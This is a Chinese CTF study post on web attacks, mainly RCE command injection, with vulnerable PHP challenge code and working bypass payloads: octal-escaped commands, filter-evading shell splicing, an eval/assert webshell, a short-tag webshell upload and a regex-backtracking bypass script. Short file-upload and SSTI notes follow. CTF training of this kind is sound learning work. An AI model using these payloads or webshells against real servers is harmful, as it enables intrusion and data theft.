<h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><p>从简单到难（基础例题示例如下，还会增加难度的）</p>
<h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p>RCE，即<strong>远程代码执行</strong>（Remote Code Execution），远程命令&#x2F;代码执行漏洞，简称为RCE漏洞，可以直接向服务器后台远程注入操作系统的命令或者代码，从而拿到服务器后台的权限。RCE分为远程执行命令（执行ping命令）和远程代码执行eval</p>
<p>(这边插入一个各种绕过.md)</p>
<h5 id="RCE命令注入分类"><a href="#RCE命令注入分类" class="headerlink" title="RCE命令注入分类"></a>RCE命令注入分类</h5><ul>
<li>无过滤</li>
<li>过滤cat</li>
<li>过滤空格</li>
<li>过滤目录分隔符</li>
<li>过滤运算符</li>
<li>综合过滤练习</li>
</ul>
<h3 id="1-无过滤简单命令拼接"><a href="#1-无过滤简单命令拼接" class="headerlink" title="(1)无过滤简单命令拼接"></a>(1)无过滤简单命令拼接</h3><h4 id="CTFHUB"><a href="#CTFHUB" class="headerlink" title="CTFHUB"></a>CTFHUB</h4><p><a target="_blank" rel="noopener" href="https://www.ctfhub.com/#/skilltree">CTFHub</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$res = FALSE;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;ip&#x27;]) &amp;&amp; $_GET[&#x27;ip&#x27;]) &#123;</span><br><span class="line">    $cmd = &quot;ping -c 4 &#123;$_GET[&#x27;ip&#x27;]&#125;&quot;;</span><br><span class="line">    exec($cmd, $res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">if ($res) &#123;</span><br><span class="line">    print_r($res);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/pre&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">show_source(__FILE__);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>就是个简单的命令拼接(127.0.0.1;ls)</p>
<p>Shell 提供了多种方式来分隔命令，分号就是其中一种。它的作用是告诉 Shell，将分号前后的命令依次执行，而不考虑前一条命令是否执行成功 。例如，在命令 “<code>ping -c 4 127.0.0.1;ls /</code>” 中，Shell 先执行 “<code>ping -c 4 127.0.0.1</code>” 命令，不管这个命令是成功（返回 0）还是失败（返回非 0 值），都会接着执行 “<code>ls /</code>” 命令</p>
<ul>
<li>Enter(换行符)</li>
<li>&amp;&amp; 前一条命令执行成功（返回值为 0）时，才会执行后一条命令</li>
<li>双管道符（||）前一条命令执行失败（返回值非 0）时，才会执行后一条命令</li>
<li>管道符（|） 将前一条命令的输出作为后一条命令的输入</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls / | grep <span class="string">&quot;txt&quot;</span>  <span class="comment"># 列出根目录下包含 &quot;txt&quot; 的文件</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>尖括号（ &lt; 和 &gt; ）</p>
<p><strong>特点</strong>：</p>
</li>
<li><p><code>&gt;</code>：将命令输出重定向到文件（覆盖）。</p>
</li>
<li><p><code>&gt;&gt;</code>：将命令输出追加到文件。</p>
</li>
<li><p><code>&lt;</code>：将文件内容作为命令的输入。</p>
</li>
<li><p>E.G：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> / &gt; output.txt  <span class="comment"># 将 ls 的输出保存到 output.txt</span></span><br><span class="line"><span class="built_in">sort</span> &lt; input.txt   <span class="comment"># 将 input.txt 的内容作为 sort 的输入</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="NCTF2024"><a href="#NCTF2024" class="headerlink" title="NCTF2024"></a>NCTF2024</h4><p>payload:</p>
<p><code>127.0.0.1 --eval eval(&quot;__import__(&#39;os&#39;).system(&#39;echo$IFS$FLAG&gt;&gt;demo&#39;)&quot;)</code></p>
<p><code>--eval</code> 用于在命令行上直接执行一段脚本代码</p>
<p>…..</p>
<p>…..</p>
<h3 id="2-过滤命令"><a href="#2-过滤命令" class="headerlink" title="(2)过滤命令"></a>(2)过滤命令</h3><h4 id="ezRCE"><a href="#ezRCE" class="headerlink" title="ezRCE"></a>ezRCE</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$white_list</span> = [<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;8&#x27;</span>,<span class="string">&#x27;9&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;$&#x27;</span>,<span class="string">&#x27;&lt;&#x27;</span>]; </span><br><span class="line">    <span class="variable">$cmd_char</span> = <span class="title function_ invoke__">str_split</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$cmd_char</span> <span class="keyword">as</span> <span class="variable">$char</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$char</span>, <span class="variable">$white_list</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;really ez?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$cmd</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$cmd</span>=<span class="title function_ invoke__">waf</span>(<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>]);</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br></pre></td></tr></table></figure>

<p><strong>八进制绕过</strong></p>
<p><em><strong>知识点：linux中使用$’xxx’（xxx为字符的八进制）的形式可以执行任意代码</strong></em></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$</span><span class="language-bash"><span class="string">&#x27;\154\163&#x27;</span> //执行<span class="built_in">ls</span></span></span><br></pre></td></tr></table></figure>

<p>发现可以成功执行</p>
<p>但是八进制的执行方法不能执行带有参数的linux命令，如cat &#x2F;flag(&#x2F;flag为参数)或ls -la(-la为参数)</p>
<p><strong>重定向符号可以代替命令中的空格</strong></p>
<p><strong>最终payload</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$</span><span class="language-bash"><span class="string">&#x27;\143\141\164&#x27;</span>&lt;$<span class="string">&#x27;\57\146\154\141\147&#x27;</span> // <span class="built_in">cat</span>&lt;/flag</span></span><br></pre></td></tr></table></figure>



<h4 id="CMCTF-CM-CTF-函数重生版"><a href="#CMCTF-CM-CTF-函数重生版" class="headerlink" title="CMCTF - CM::CTF 函数重生版"></a><a target="_blank" rel="noopener" href="http://ctf.coldwindy.cn/games/5/challenges">CMCTF - CM::CTF</a> 函数重生版</h4><p>（不当人）</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;i&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">switch</span>(<span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;i&#x27;</span>],<span class="number">0</span>,<span class="number">6</span>)))&#123;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/php|flag|zlib|ftp|system|shell_exec|exec|file_get_contents|proc_open|fopen|fgets|file_put_contents|file|fread|readfile|stream_get_contents|cat|more|tac|\:|\]|\[|\+|\-|\*|\eval|\^|\`|\&quot;|\&lt;|\&gt;|\\|\/|\ssh/i&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;i&#x27;</span>]))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;i&#x27;</span>]);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">        &#125;<span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里没过滤大括号和单引号，可以采用一个{}来代替[]，然后参数逃逸一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?i=eval($_GET&#123;%27a%27&#125;);&amp;a=assert(eval($_POST[%27x%27]));</span><br></pre></td></tr></table></figure>

<p>可以直接蚁剑连</p>
<h4 id="2025H-NCTF-2025H-N-CTF-Really-Ez-Rce"><a href="#2025H-NCTF-2025H-N-CTF-Really-Ez-Rce" class="headerlink" title="2025H&amp;NCTF - 2025H&amp;N::CTF Really_Ez_Rce"></a><a target="_blank" rel="noopener" href="https://2025hnctf.huhstsec.top/games/2/challenges#10-Really_Ez_Rce">2025H&amp;NCTF - 2025H&amp;N::CTF</a> Really_Ez_Rce</h4><p>（更不当人）</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: text/html; charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;Number&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$inputNumber</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;Number&#x27;</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\d/&#x27;</span>, <span class="variable">$inputNumber</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;不行不行,不能这样&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">intval</span>(<span class="variable">$inputNumber</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;OK,接下来你知道该怎么做吗&quot;</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">            <span class="variable">$cmd</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(</span><br><span class="line">                <span class="string">&#x27;/wget|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|ping|\\*|sort|zip|mod|sl|find|sed|cp|mv|ty|php|tee|txt|grep|base|fd|df|\\\\|more|cc|tac|less|head|\.|\&#123;|\&#125;|uniq|copy|%|file|xxd|date|\[|\]|flag|bash|env|!|\?|ls|\&#x27;|\&quot;|id/i&#x27;</span>,</span><br><span class="line">                <span class="variable">$cmd</span></span><br><span class="line">            )) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;你传的参数似乎挺正经的,放你过去吧&lt;br&gt;&quot;</span>;</span><br><span class="line">                <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;nonono,hacker!!!&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个Number简单，直接给个数组就绕过了，Number[]&#x3D;a，重点是这个正则</p>
<p>没过滤$，直接参数拼接</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Number[]=a&amp;cmd=b=l;c=s;d=/;$b$c%20$d;</span><br><span class="line"></span><br><span class="line">Number[]=a&amp;cmd=b=bas;c=e64;a=s;c=h;echo%2Y2F0IGZsYWcudHh0|$b$c%20-d|$a$c</span><br></pre></td></tr></table></figure>





<h4 id="BUUCTF在线评测-https-buuoj-cn-challenges-红明谷CTF-2021-write-shell-Write-shell"><a href="#BUUCTF在线评测-https-buuoj-cn-challenges-红明谷CTF-2021-write-shell-Write-shell" class="headerlink" title="[BUUCTF在线评测](https://buuoj.cn/challenges#[红明谷CTF 2021]write_shell) Write_shell"></a>[BUUCTF在线评测](<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[%E7%BA%A2%E6%98%8E%E8%B0%B7CTF">https://buuoj.cn/challenges#[红明谷CTF</a> 2021]write_shell) Write_shell</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$input</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/&#x27;| |_|php|;|~|\\^|\\+|eval|&#123;|&#125;/i&quot;</span>,<span class="variable">$input</span>))&#123;</span><br><span class="line">        <span class="comment">// if(preg_match(&quot;/&#x27;| |_|=|php/&quot;,$input))&#123;</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker!!!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$input</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$input</span></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$input</span>))&#123;</span><br><span class="line">      <span class="keyword">foreach</span>(<span class="variable">$input</span> <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$output</span>)&#123;</span><br><span class="line">          <span class="variable">$input</span>[<span class="variable">$key</span>] = <span class="title function_ invoke__">waf</span>(<span class="variable">$output</span>);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="variable">$input</span> = <span class="title function_ invoke__">check</span>(<span class="variable">$input</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$dir</span> = <span class="string">&#x27;sandbox/&#x27;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$dir</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">mkdir</span>(<span class="variable">$dir</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">switch</span>(<span class="variable">$_GET</span>[<span class="string">&quot;action&quot;</span>] ?? <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;pwd&#x27;</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$dir</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;upload&#x27;</span>:</span><br><span class="line">        <span class="variable">$data</span> = <span class="variable">$_GET</span>[<span class="string">&quot;data&quot;</span>] ?? <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">waf</span>(<span class="variable">$data</span>);</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;<span class="subst">$dir</span>&quot;</span> . <span class="string">&quot;index.php&quot;</span>, <span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>payload:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?action=upload&amp;data=&lt;?echo%09`ls%09/`?&gt;</span><br></pre></td></tr></table></figure>

<p>因为题目中过滤了php，所以用php短标签来绕过<code>&lt;?= ?&gt;</code>等效于<code>&lt;?echo ?&gt;</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br></pre></td></tr></table></figure>

<p>输出访问者的IP地址</p>
<h3 id="3-回溯限制"><a href="#3-回溯限制" class="headerlink" title="(3)回溯限制"></a>(3)回溯限制</h3><h4 id="NISACTF-2022-middlerce-NSSCTF"><a href="#NISACTF-2022-middlerce-NSSCTF" class="headerlink" title="[NISACTF 2022]middlerce | NSSCTF"></a>[<a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/1897">NISACTF 2022]middlerce | NSSCTF</a></h4><p>PHP 为了防止正则表达式的拒绝服务攻击（reDOS），给 pcre 设定了一个回溯次数上限 pcre.backtrack_limit ： <code>1000000</code></p>
<p>当回溯次数超过100万次时，preg_match返回的就是false，表示此次实行失败（超出限制）</p>
<p>所以我们可以通过发送超长字符串来使正则执行失败，绕过对php的限制</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&#x27;http://node4.anna.nssctf.cn:28058/&#x27;</span></span><br><span class="line">payload = <span class="string">&#x27;&#123;&quot;cmd&quot;:&quot;?&gt;&lt;?=`sort /f*`?&gt;&quot;,&quot;+&quot;:&quot;&#x27;</span> + <span class="string">&quot;-&quot;</span> * <span class="number">1000000</span> + <span class="string">&#x27;&quot;&#125;&#x27;</span></span><br><span class="line">res = requests.post(url=url, data=&#123;<span class="string">&quot;letter&quot;</span>: payload&#125;)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure>



<h3 id="（4）无回显RCE（利用http标头）"><a href="#（4）无回显RCE（利用http标头）" class="headerlink" title="（4）无回显RCE（利用http标头）"></a>（4）无回显RCE（利用http标头）</h3><p>[BUUCTF在线评测](<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[NewStarCTF">https://buuoj.cn/challenges#[NewStarCTF</a> 2023 公开赛道]R!!C!!E!!) R!!C!!E!!</p>
<h3 id="（5）无回显RCE（只允许用特殊字符）"><a href="#（5）无回显RCE（只允许用特殊字符）" class="headerlink" title="（5）无回显RCE（只允许用特殊字符）"></a>（5）无回显RCE（只允许用特殊字符）</h3><p>[<a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/909">安洵杯 2020]BASH | NSSCTF</a></p>
<p><a target="_blank" rel="noopener" href="https://probiusofficial.github.io/bashFuck/">BashFuck Payload Generator</a></p>
<h3 id="（6）无回显RCE（写文件到其他地方）"><a href="#（6）无回显RCE（写文件到其他地方）" class="headerlink" title="（6）无回显RCE（写文件到其他地方）"></a>（6）无回显RCE（写文件到其他地方）</h3><p>[BUUCTF在线评测](<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[NewStarCTF">https://buuoj.cn/challenges#[NewStarCTF</a> 2023 公开赛道]R!!!C!!!E!!!) </p>
<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p>include和file_get_content</p>
<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p>[CTF show 文件上传篇（web151-170，看这一篇就够啦）-CSDN博客](<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_65165505/article/details/141370798#:~:text=%E5%9C%A8%E6%88%91%E4%BB%AC%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6%E5%90%8E%EF%BC%8C%E7%BD%91%E7%AB%99%E4%BC%9A%E5%AF%B9%E5%9B%BE%E7%89%87%E8%BF%9B%E8%A1%8C%E4%BA%8C%E6%AC%A1%E5%A4%84%E7%90%86%EF%BC%88%E6%A0%BC%E5%BC%8F%E3%80%81%E5%B0%BA%E5%AF%B8%E8%A6%81%E6%B1%82%E7%AD%89%EF%BC%89%EF%BC%8C%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BC%9A%E6%8A%8A%E9%87%8C%E9%9D%A2%E7%9A%84%E5%86%85%E5%AE%B9%E8%BF%9B%E8%A1%8C%E6%9B%BF%E6%8D%A2%E6%9B%B4%E6%96%B0%EF%BC%8C%E5%A4%84%E7%90%86%E5%AE%8C%E6%88%90%E5%90%8E%EF%BC%8C%E6%A0%B9%E6%8D%AE%E6%88%91%E4%BB%AC%E5%8E%9F%E6%9C%89%E7%9A%84%E5%9B%BE%E7%89%87%E7%94%9F%E6%88%90%E4%B8%80%E4%B8%AA%E6%96%B0%E7%9A%84%E5%9B%BE%E7%89%87%E5%B9%B6%E6%94%BE%E5%88%B0%E7%BD%91%E7%AB%99%E5%AF%B9%E5%BA%94%E7%9A%84%E6%A0%87%E7%AD%BE%E8%BF%9B%E8%A1%8C%E6%98%BE%E7%A4%BA%E3%80%82,%E5%B0%86%E4%B8%80%E4%B8%AA%E6%AD%A3%E5%B8%B8%E6%98%BE%E7%A4%BA%E7%9A%84%E5%9B%BE%E7%89%87%EF%BC%8C%E4%B8%8A%E4%BC%A0%E5%88%B0%E6%9C%8D%E5%8A%A1%E5%99%A8%E3%80%82">https://blog.csdn.net/qq_65165505/article/details/141370798#:~:text=在我们上传文件后，网站会对图片进行二次处理（格式、尺寸要求等），服务器会把里面的内容进行替换更新，处理完成后，根据我们原有的图片生成一个新的图片并放到网站对应的标签进行显示。,将一个正常显示的图片，上传到服务器。</a> 寻找图片被渲染后与原始图片部分对比仍然相同的数据块部分，将Webshell代码插在该部分，然后上传。)</p>
<h3 id="1-普通php-phtml文件上传"><a href="#1-普通php-phtml文件上传" class="headerlink" title="(1)普通php&#x2F;phtml文件上传"></a>(1)普通php&#x2F;phtml文件上传</h3><h3 id="2-通过burpsuite拦截抓包更改后缀"><a href="#2-通过burpsuite拦截抓包更改后缀" class="headerlink" title="(2)通过burpsuite拦截抓包更改后缀"></a>(2)通过burpsuite拦截抓包更改后缀</h3><h4 id="攻防世界"><a href="#攻防世界" class="headerlink" title="攻防世界"></a><a target="_blank" rel="noopener" href="https://adworld.xctf.org.cn/challenges/list">攻防世界</a></h4><p>就是个简单的拦截改成后缀为php</p>
<h3 id="3-通过-htaccess或者user-ini进行文件上传"><a href="#3-通过-htaccess或者user-ini进行文件上传" class="headerlink" title="(3)通过.htaccess或者user.ini进行文件上传"></a>(3)通过.htaccess或者user.ini进行文件上传</h3><p>[BUUCTF在线评测](<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[NewStarCTF">https://buuoj.cn/challenges#[NewStarCTF</a> 2023 公开赛道]Upload again!) 运用.htaccess</p>
<h3 id="4-通过文件名传马"><a href="#4-通过文件名传马" class="headerlink" title="(4)通过文件名传马"></a>(4)通过文件名传马</h3><p>[BUUCTF在线评测](<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[CISCN2019">https://buuoj.cn/challenges#[CISCN2019</a> 总决赛 Day2 Web1]Easyweb)</p>
<h2 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">因为hexo的关系，这里不在代码块外的&#123;&#123;&#125;&#125;统一换成&#123;&#123;...&#125;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="1-原理"><a href="#1-原理" class="headerlink" title="(1)原理"></a>(1)原理</h3><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU/articles/18442823">CTF web漏洞合集 Python篇（1）python中的SSTI - LamentXU - 博客园</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/tuzkizki/p/15394415.html">Python SSTI漏洞学习总结 - Tuzkizki - 博客园</a></p>
<p><a target="_blank" rel="noopener" href="https://antel0p3.github.io/2023/10/20/ssti/">SSTI模板注入 | Antel0p3’s blog</a></p>
<p>介于jinja2出现的非常多，就只看看jinja2</p>
<p><img src="/img/lazy.gif" data-original="/2025/05/31/Web%E5%9F%BA%E7%A1%80-1/w1.png"></p>
<p>先看这个包浆的图片（）</p>
<p>可以知道49如果回显是49（也就是执行了里面的命令）的话，就说明存在SSTI</p>
<p>然后可以再试NaN，如果还是49就可以下判断了，但是一般题目就是前一步可以直接下结论是jinja2内部存在的SSTI</p>
<p><strong>那么什么是jinja2？</strong></p>
<p>Jinja 模板只是一个文本文件，可以 基于模板生成任何基于文本的格式（HTML、XML、CSV、LaTeX 等），一般用在前端的项目中，渲染 HTML 文件</p>
<p>模板包含变量或表达式，这两者在模板求值的时候会被替换为值。模板中还有标签，控制模板的逻辑。模板语法的大量灵感来自于 Django 和 Python </p>
<p>基本语法：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">语句 &#123;% ... %&#125;</span><br><span class="line">变量 &#123;&#123; ... &#125;&#125;</span><br><span class="line">注释 &#123;# ... #&#125;</span><br></pre></td></tr></table></figure>

<p>常用的语句包括：for、if、set、include、block、filter 等</p>
